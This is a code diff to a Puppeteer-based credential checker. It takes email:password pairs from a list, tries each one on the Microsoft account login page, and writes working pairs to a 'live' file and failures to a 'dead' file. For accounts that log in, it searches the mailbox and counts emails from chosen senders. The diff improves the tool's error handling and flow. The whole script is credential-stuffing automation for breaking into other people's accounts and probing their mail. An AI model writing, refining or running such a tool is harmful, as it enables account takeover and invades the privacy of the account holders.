@@ -14,8 +14,6 @@ const STAY_SIGNED_IN_SELECTOR = "#kmsiTitle";
 const EMAIL_ERROR_SELECTOR = "#i0116Error";
 const PASSWORD_ERROR_SELECTOR = "#i0118Error";
 
-let isRunning = false;
-
 // Sleep function to pause execution
 const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
 
@@ -76,8 +74,6 @@ const checkEmailWithPuppeteer = async (
   liveWriter,
   deadWriter
 ) => {
-  isRunning = true;
-
   const browser = await puppeteer.launch({ headless: false });
   const page = await browser.newPage();
 
@@ -91,74 +87,68 @@ const checkEmailWithPuppeteer = async (
     await page.type("#i0116", email, { delay: 100 });
     await page.click("#idSIButton9");
 
-    const emailError = await Promise.race([
-      page.waitForSelector("#i0118", { timeout: 5000 }).then(() => null),
-      page.waitForSelector(EMAIL_ERROR_SELECTOR, { timeout: 5000 }),
-    ]);
-
-    if (emailError) {
+    try {
+      await page.waitForSelector(EMAIL_ERROR_SELECTOR, { timeout: 5000 });
       const errorMsg = await page.$eval(
         EMAIL_ERROR_SELECTOR,
         (el) => el.textContent
       );
       console.log(chalk.red(`❌ Email error: ${errorMsg}`));
       deadWriter.write(`${email}:${password} | Email Error: ${errorMsg}\n`);
-      isRunning = false; // Set isRunning to false when done
-      return isRunning;
+      return;
+    } catch (e) {
+      // No email error, proceed
     }
 
     // Step 3: Fill in the password and handle potential errors
     await page.type("#i0118", password, { delay: 100 });
     await page.click("#idSIButton9");
 
-    const passwordError = await Promise.race([
-      page.waitForNavigation({ waitUntil: "networkidle2" }).then(() => null),
-      page.waitForSelector(PASSWORD_ERROR_SELECTOR, { timeout: 5000 }),
-    ]);
-
-    if (passwordError) {
+    try {
+      await page.waitForSelector(PASSWORD_ERROR_SELECTOR, { timeout: 5000 });
       const errorMsg = await page.$eval(
         PASSWORD_ERROR_SELECTOR,
         (el) => el.textContent
       );
       console.log(chalk.red(`❌ Password error: ${errorMsg}`));
       deadWriter.write(`${email}:${password} | Password Error: ${errorMsg}\n`);
-      isRunning = false; // Set isRunning to false when done
-      return isRunning;
+      return;
+    } catch (e) {
+      // No password error, proceed
     }
 
     // Step 4: Handle "Stay Signed In?" prompt
-    await page.waitForSelector("#kmsiTitle");
-    await page.click("#acceptButton");
-    await page.waitForNavigation({ waitUntil: "networkidle2" });
+    try {
+      await page.waitForSelector(STAY_SIGNED_IN_SELECTOR, { timeout: 5000 });
+      await page.click("#idSIButton9");
+    } catch (e) {
+      // No "Stay Signed In" prompt, proceed
+    }
+
     console.log(chalk.green(`✅ Login successful for: ${email}`));
 
     // Step 5: Perform email search and filter if filters exist
     await page.goto(MAILBOX_URL, { waitUntil: "networkidle0" });
-    await page.waitForSelector("#topSearchInput");
+    await page.waitForSelector(SEARCH_INPUT_SELECTOR);
 
     let liveEntry = `${email}:${password}`;
     if (filters && filters.length > 0) {
       for (const filterEmail of filters) {
-        await page.waitForNavigation({ waitUntil: "networkidle2" });
-        console.log(`Searching for emails from: ${filterEmail}`);
-        await page.type("#topSearchInput", `from:${filterEmail}`);
-        await page.click('button[class="nUPgy"]');
-        await page.click('button[aria-label="Search"]');
+        await page.type(SEARCH_INPUT_SELECTOR, `from:${filterEmail}`);
+        await page.click(SEARCH_BUTTON_SELECTOR);
 
-        await sleep(1000); // Shortened sleep for testing purposes
+        await sleep(3000); // Give time for the search to complete
+
         try {
-          await page.waitForSelector(".jGG6V.gDC9O", { timeout: 5000 });
-          const results = await page.$$eval(
-            ".jGG6V.gDC9O",
-            (elements) => elements.length
-          );
+          const results = await page.$$eval(".jGG6V.gDC9O", (elements) => elements.length);
           liveEntry += ` | ${results} emails found from ${filterEmail}`;
         } catch (e) {
           liveEntry += ` | No emails found from ${filterEmail}`;
         }
+
+        // Clear the search input field
         await page.evaluate(
-          () => (document.querySelector("#topSearchInput").value = "")
+          () => (document.querySelector(SEARCH_INPUT_SELECTOR).value = "")
         );
       }
     } else {
@@ -168,14 +158,11 @@ const checkEmailWithPuppeteer = async (
     stats.live++;
     liveWriter.write(liveEntry + "\n");
     console.log(chalk.green(`✅ ${liveEntry}`));
-    isRunning = false; // Set isRunning to false when done
-    return isRunning;
+
   } catch (error) {
     stats.dead++;
     console.error(`Login failed for ${email}:`, error);
     deadWriter.write(`${email}:${password} | Error: ${error.message}\n`);
-    isRunning = false; // Set isRunning to false when done
-    return isRunning;
   } finally {
     await page.close();
     await browser.close();
@@ -201,18 +188,7 @@ const processFile = async (inputFile, filters) => {
 
   for (let line of lines) {
     const [email, password] = line.split(":");
-
-    // Wait until isRunning becomes false
-    while (!isRunning) {
-      isRunning = await checkEmailWithPuppeteer(
-        email,
-        password,
-        filters,
-        liveWriter,
-        deadWriter
-      );
-    }
-
+    await checkEmailWithPuppeteer(email, password, filters, liveWriter, deadWriter);
     console.log(`Task completed for ${email}`);
     await sleep(1000); // Add delay between requests
   }
